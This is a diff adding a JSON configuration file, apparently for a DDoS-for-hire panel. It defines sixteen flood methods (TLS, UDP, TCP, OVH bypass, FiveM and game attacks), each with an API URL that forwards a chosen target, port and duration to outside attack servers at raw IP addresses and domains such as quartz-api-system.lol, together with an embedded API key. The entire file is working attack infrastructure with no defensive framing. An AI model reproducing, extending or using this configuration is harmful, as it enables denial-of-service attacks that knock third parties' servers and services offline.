@@ -1,0 +1,213 @@
+{
+     "Attacks" : [
+
+          {
+               "Name" : "https-vip",
+               "AttackName" : "https-vip", 
+               "Description" : "AWS Standard TLS Flood",
+               "API" : "http://45.13.227.241:90/?host=<<$target>>&time=<<$duration>>&rqs=64&concs=1&methods=https",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "https",
+               "AttackName" : "https",
+               "Description" : "GoSec Tls Beta",
+               "API" : "http://hivernalsolution.xyz/?host=<<$target>>&time=<<$duration>>&rqs=64&concs=1&methods=https",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },                 
+          {
+               "Name" : "udp-flood",
+               "AttackName" : "udp-flood",
+               "Description" : "GoSec Standard UDP Flood",
+               "API" : "http://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=UDP-BYPASS",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "tcp-basic",
+               "AttackName" : "tcp-basic",
+               "Description" : "GoSec TCP Attack",
+               "API" : "http://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=QUARTZ-TCP",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "udp-basic",
+               "AttackName" : "udp-basic",
+               "Description" : "GoSec UDP Attack",
+               "API" : "http://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=QUARTZ-UDP",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "tcp-flood",
+               "AttackName" : "tcp-flood",
+               "Description" : "GoSec TCP Attack",
+               "API" : "http://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=TCP-WAR",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "ovh-mix",
+               "AttackName" : "tcp-flood",
+               "Description" : "GoSec TCP Attack",
+               "API" : "http://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=QUARTZ-OVHTCP",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "ovh-vip",
+               "AttackName" : "ovh-vip",
+               "Description" : "GoSec OVH Attack",
+               "API" : "http://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=OVH-DEATH",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "game-sec",
+               "AttackName" : "game-sec",
+               "Description" : "GoSec Game Attack",
+               "API" : "http://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=QUARTZ-GAME",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "tls-flood",
+               "AttackName" : "tls-flood",
+               "Description" : "GoSec Game Attack",
+               "API" : "http://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=TLS-QUARTZ",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "http-fivem",
+               "AttackName" : "http-fivem",
+               "Description" : "GoSec FiveM Attack",
+               "API" : "http://45.11.229.109/?host=<<$target>>&time=<<$duration>>&rqs=64&concs=1&methods=pee",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "raw-tls",
+               "AttackName" : "raw-tls",
+               "Description" : "GoSec FiveM Attack",
+               "API" : "http://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=QUARTZ-RAWL7",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "box",
+               "AttackName" : "box",
+               "Description" : "GoSec FiveM Attack",
+               "API" : "http://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=QUARTZ-HOME",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "http-sex",
+               "AttackName" : "http-fivem",
+               "Description" : "GoSec FiveM Attack",
+               "API" : "http://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=QUARTZ-BYPL7",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "socket",
+               "AttackName" : "socket",
+               "Description" : "Quartz Socket Attack",
+               "API" : "http://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=QUARTZ-SOCKET",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "handshake",
+               "AttackName" : "handshake",
+               "Description" : "Quartz Handshake Attack",
+               "API" : "http://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=QUARTZ-HANDSHAKE",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          }
+     ]
+}
